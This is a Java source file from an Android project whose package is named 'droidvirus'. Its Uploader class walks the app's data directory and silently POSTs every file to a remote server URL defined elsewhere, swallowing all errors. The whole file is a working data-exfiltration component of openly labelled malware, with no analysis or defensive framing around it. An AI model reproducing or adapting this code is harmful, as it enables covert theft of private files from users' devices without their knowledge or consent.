package com.artisanter.droidvirus;

import android.content.Context;

import org.apache.http.HttpEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.entity.mime.MultipartEntityBuilder;

import java.io.File;

class Uploader {
    static void uploadAll(Context context){
        String dir = context.getApplicationInfo().dataDir;
        for(File file: new File(dir).listFiles()) {
            postFile(file.getName(), file);
        }
    }
    private static void postFile(final String fileName, final File file) {
        DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
        HttpPost httpPost = new HttpPost(ServiceUrl.URL);
        try {
            HttpEntity httpEntity = MultipartEntityBuilder.create()
                    .addBinaryBody(fileName, file, ContentType.MULTIPART_FORM_DATA, fileName).build();
            httpPost.setEntity(httpEntity);
            httpPost.setHeader("Accept", "application/json");
            httpPost.setHeader("Accept-Encoding", "gzip");

            defaultHttpClient.execute(httpPost);
        } catch (Exception ignored) {}
    }
}
